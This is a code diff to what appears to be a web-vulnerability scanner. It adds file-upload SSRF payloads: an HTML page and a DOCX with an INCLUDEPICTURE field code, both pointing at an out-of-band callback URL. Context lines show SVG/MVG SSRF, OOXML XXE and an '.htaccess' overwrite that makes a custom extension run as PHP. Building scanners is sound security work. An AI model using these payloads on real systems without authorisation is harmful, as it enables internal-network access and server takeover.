@@ -570,6 +570,14 @@ func fileUploadAttempts(oob oobCapability, hasOOB bool, db *database.DB, targetI
 		for _, spec := range []struct{ name, subtype, filename, mime, kind, format string }{
 			{"SVG image-processing SSRF", "image_processing_ssrf", "recon-oob.svg", "image/svg+xml", "file_upload_ssrf", `<svg xmlns="http://www.w3.org/2000/svg"><image href="%s"/></svg>`},
 			{"MVG image-processing SSRF", "image_processing_ssrf", "recon-oob.mvg", "image/x-mvg", "file_upload_ssrf", "push graphic-context\nviewbox 0 0 1 1\nimage over 0,0 1,1 '%s'\npop graphic-context"},
+			// A server that renders an uploaded HTML file for preview/thumbnail
+			// generation (headless-Chromium screenshot, wkhtmltopdf/wkhtmltoimage)
+			// fetches every resource the page references, including from the
+			// server's own network position — the same SSRF class as the
+			// SVG/MVG image-processing delegates above, just for a different
+			// rendering pipeline. %[1]s is reused for both tags so one OOB
+			// token catches whichever resource type the renderer actually fetches.
+			{"HTML-rendering SSRF (preview/PDF pipelines)", "image_processing_ssrf", "recon-oob.html", "text/html", "file_upload_ssrf", `<html><body><img src="%[1]s" width="1" height="1"><iframe src="%[1]s"></iframe></body></html>`},
 		} {
 			token := registerOOBProbe(db, targetID, ip.URL, ip.Param, spec.kind, "upload:"+spec.filename)
 			out = append(out, fileUploadAttempt{name: spec.name, subtype: spec.subtype, filename: spec.filename, contentType: spec.mime,
@@ -595,6 +603,23 @@ func fileUploadAttempts(oob oobCapability, hasOOB bool, db *database.DB, targetI
 			out = append(out, fileUploadAttempt{name: strings.ToUpper(doc.ext) + " embedded XXE", subtype: "ooxml_xxe", filename: "recon." + doc.ext,
 				contentType: doc.mime, body: body, marker: token, proof: proofOOB, oobKind: "file_upload_xxe"})
 		}
+		// Word's own INCLUDEPICTURE field code is a legitimate, non-CVE-specific
+		// SSRF source distinct from the XXE above: a document-preview/conversion
+		// pipeline that renders field codes (LibreOffice/Word headless
+		// conversion) fetches the field's URL server-side to resolve the
+		// picture, regardless of whether the converter's XML parser resolves
+		// external entities at all.
+		fieldToken := registerOOBProbe(db, targetID, ip.URL, ip.Param, "file_upload_ssrf", "upload:recon-fields.docx")
+		fieldXML := `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>` +
+			`<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r>` +
+			`<w:fldSimple w:instr="INCLUDEPICTURE &quot;` + oob.callbackURL(fieldToken) + `&quot; \* MERGEFORMAT">` +
+			`<w:r><w:t>SSRF</w:t></w:r></w:fldSimple></w:r></w:p></w:body></w:document>`
+		fieldBody := zipUpload(map[string][]byte{
+			"[Content_Types].xml": []byte(`<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>`),
+			"word/document.xml":   []byte(fieldXML),
+		})
+		out = append(out, fileUploadAttempt{name: "DOCX field-code (INCLUDEPICTURE) SSRF", subtype: "ooxml_field_code_ssrf", filename: "recon-fields.docx",
+			contentType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", body: fieldBody, marker: fieldToken, proof: proofOOB, oobKind: "file_upload_ssrf"})
 	}
 	out = append(out,
 		fileUploadAttempt{name: "Apache web-root config overwrite", subtype: "webroot_config_overwrite", filename: ".htaccess", contentType: "text/plain", body: []byte("AddType application/x-httpd-php .rcn\n"), marker: newXSSToken("rcnconf"), proof: proofConfigEffect},
